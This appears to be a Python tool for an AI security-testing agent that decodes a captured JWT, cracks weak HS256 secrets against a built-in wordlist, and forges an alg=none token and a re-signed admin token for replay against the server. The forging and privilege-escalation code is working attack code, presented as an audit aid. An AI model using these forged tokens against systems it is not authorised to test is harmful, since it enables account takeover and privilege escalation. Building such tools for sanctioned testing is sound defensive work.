"""Offline JWT audit — decode, flag misconfig, forge attack tokens.

AI codegen ships JWTs that skip signature verification, allow alg confusion,
or sign with a guessable secret. This decodes a captured token, cracks weak
HS256 secrets against a built-in wordlist, and emits ready-to-replay attack
tokens (alg=none, and a resigned admin token if the secret cracks). No network:
the agent replays the forged tokens with http_replay to confirm acceptance.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import time
from typing import Any

from agents import RunContextWrapper, function_tool


# Common secrets AI codegen / tutorials ship. Extend via extra_secrets.
_COMMON_SECRETS = (
    "secret",
    "secret123",
    "password",
    "changeme",
    "your-256-bit-secret",
    "your_jwt_secret",
    "jwt_secret",
    "jwtsecret",
    "supersecret",
    "super-secret",
    "mysecret",
    "admin",
    "test",
    "key",
    "private",
    "s3cr3t",
    "qwerty",
    "0000",
)


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _sign_hs256(signing_input: str, secret: str) -> str:
    sig = hmac.new(secret.encode("utf-8"), signing_input.encode("ascii"), hashlib.sha256).digest()
    return _b64url_encode(sig)


def _decode_part(segment: str) -> dict[str, Any] | None:
    try:
        parsed = json.loads(_b64url_decode(segment))
    except (ValueError, json.JSONDecodeError):
        return None
    return parsed if isinstance(parsed, dict) else None


def _crack_hs256(
    header_b64: str, payload_b64: str, signature: str, secrets: list[str]
) -> str | None:
    signing_input = f"{header_b64}.{payload_b64}"
    for secret in secrets:
        if hmac.compare_digest(_sign_hs256(signing_input, secret), signature):
            return secret
    return None


def _forge_none(header: dict[str, Any], payload: dict[str, Any]) -> str:
    forged_header = {**header, "alg": "none"}
    h = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _forge_admin(payload: dict[str, Any], secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    escalated = {**payload}
    for field, value in (("role", "admin"), ("is_admin", True), ("admin", True)):
        if field in escalated:
            escalated[field] = value
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(escalated, separators=(",", ":")).encode())
    return f"{h}.{p}.{_sign_hs256(f'{h}.{p}', secret)}"


def _jwt_audit_impl(token: str, extra_secrets: list[str] | None) -> dict[str, Any]:
    token = (token or "").strip()
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False, "error": "not a JWT (expected header.payload.signature)"}
    header_b64, payload_b64, signature = parts
    header = _decode_part(header_b64)
    payload = _decode_part(payload_b64)
    if header is None or payload is None:
        return {"success": False, "error": "header/payload is not valid base64url JSON"}

    alg = str(header.get("alg", "")).lower()
    findings: list[str] = []
    if alg == "none":
        findings.append("token already uses alg=none (signature not verified)")
    exp = payload.get("exp")
    expired = isinstance(exp, (int, float)) and exp < time.time()
    if exp is None:
        findings.append("no exp claim (token never expires)")
    elif expired:
        findings.append("token is expired — retest whether the server still accepts it")

    cracked = None
    if alg in {"hs256", "hs384", "hs512"}:
        secrets = list(_COMMON_SECRETS) + list(extra_secrets or [])
        cracked = _crack_hs256(header_b64, payload_b64, signature, secrets)
        if cracked is not None:
            findings.append(f"HS256 secret cracked from wordlist: {cracked!r}")

    forged = {"alg_none": _forge_none(header, payload)}
    if cracked is not None:
        forged["admin_hs256"] = _forge_admin(payload, cracked)

    return {
        "success": True,
        "alg": header.get("alg"),
        "header": header,
        "payload": payload,
        "expired": expired,
        "cracked_secret": cracked,
        "findings": findings,
        # Replay these with http_replay (Authorization: Bearer <token>). If the
        # server accepts alg_none or the resigned admin token, it's confirmed.
        "forged_tokens": forged,
        "possible_jwt_issue": bool(findings),
    }


@function_tool(timeout=30, strict_mode=False)
async def jwt_audit(
    ctx: RunContextWrapper,
    token: str,
    extra_secrets: list[str] | None = None,
) -> str:
    """Audit a captured JWT offline and forge attack tokens to replay.

    Decodes the token, flags alg=none / missing-exp / expired, and cracks weak
    HS256 secrets against a built-in wordlist (extend with ``extra_secrets``).
    Emits an ``alg=none`` token and, if the secret cracks, a resigned admin
    token — replay them with ``http_replay`` (``Authorization: Bearer <token>``)
    to confirm the server accepts them.

    Returns JSON with ``alg``, decoded ``header``/``payload``, ``expired``,
    ``cracked_secret``, ``findings``, ``forged_tokens``, and
    ``possible_jwt_issue``. No network calls are made here.

    Args:
        token: The JWT to audit (``header.payload.signature``).
        extra_secrets: Extra candidate HMAC secrets to try when cracking.
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_jwt_audit_impl, token, extra_secrets),
        ensure_ascii=False,
        default=str,
    )
